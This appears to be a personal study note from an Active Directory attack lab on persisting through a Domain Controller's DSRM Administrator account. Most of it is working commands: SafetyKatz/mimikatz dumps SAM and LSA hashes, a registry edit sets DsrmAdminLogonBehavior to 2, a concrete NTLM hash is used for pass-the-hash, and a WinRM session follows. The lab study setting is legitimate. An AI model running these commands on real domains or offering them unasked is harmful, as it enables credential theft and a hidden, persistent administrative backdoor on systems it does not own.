Used when the directory services fail to start on the Domain Controller. You then have to boot it into safe mode.

The DRSM Administrator credentials must be used and this account is present on **every Domain Controller**. 

![[Pasted image 20250510225743.png]]

> [!NOTE] **NOTE**
> DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is **rarely** changed. 
> 
> Bro that originally set the DRSM password is probably dead or retired lol

After altering the configuration on the DC, it is possible to pass the
NTLM hash of this user to access the DC.

Dump DSRM password
```powershell
SafetyKatz.exe "token::elevate" "lsadump::evasive-sam"
```

Compare the Administrator hash with the Administrator hash of below
command. The first one is the DSRM local Administrator.
```powershell
SafetyKatz.exe "lsadump::lsa /patch"
```

Since its the local administrator of the DC, we can pass the hash to
authenticate but, the Logon Behavior for the DSRM account needs to be changed
before we can use its hash
```powershell
winrs -r:dcorp-dc cmd

reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Pass-the-Hash with DRSM Administrator account with mimikatz
```powershell
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"

Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

Enter-PSSession -ComputerName 172.16.2.1 -Authentication
NegotiateWithImplicitCredential
```
